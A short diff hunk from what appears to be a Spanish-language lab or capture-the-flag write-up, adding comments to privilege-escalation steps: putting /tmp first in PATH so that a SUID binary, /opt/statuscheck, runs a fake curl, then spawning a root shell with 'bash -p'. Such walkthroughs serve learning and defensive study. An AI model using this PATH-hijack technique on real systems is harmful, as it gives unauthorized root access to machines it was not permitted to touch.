@@ -221,9 +221,9 @@ vemos que el archivo esta haciendo un llamado al comando `curl` pero lo esta hac
 
 > export PATH=/tmp:$PATH (exportamos el directorio donde esta nuestro archivo al PATH)
 
-> /opt/statuscheck ()
+> /opt/statuscheck (ejecutamos el binario donde tenemos permisos SUID)
 
-> bash -p
+> bash -p (llamamos una bash como root)
 
 ```
 
